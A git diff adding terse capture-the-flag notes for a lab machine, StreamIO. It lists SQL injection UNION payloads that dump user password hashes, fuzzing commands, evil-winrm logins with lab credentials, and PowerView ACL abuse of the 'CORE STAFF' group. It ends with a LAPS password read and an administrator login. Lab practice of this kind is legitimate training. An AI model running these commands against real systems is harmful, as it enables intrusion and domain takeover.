@@ -87,11 +87,35 @@ Read GMSA Password
 
 
 # Win-StreamIO
+
 ```
-SQL Injection
-ffuf with authentication
-evil-winrm
-winPEAS
-BloodHound
-PowerView.ps1
+https://watch.streamio.htb/
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
+https://watch.streamio.htb/search.php
+10' union select 1,2,3,4,5,6 -- -
+10' union select 1,@@version,3,4,5,6 -- -
+10' union select 1,(select DB_NAME()),3,4,5,6 -- -
+10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
+https://crackstation.net/
+https://streamio.htb/login.php
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
+crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
+evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
+upload winPEASx64.exe
+./winPEASx64.exe
+git clone https://github.com/fox-it/BloodHound.py.git
+cd BloodHound.py
+python3 setup.py install
+python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+upload PowerView.ps1
+. .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
+Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
+Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
+Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
+net group 'CORE STAFF'
+Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
+evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
 ```
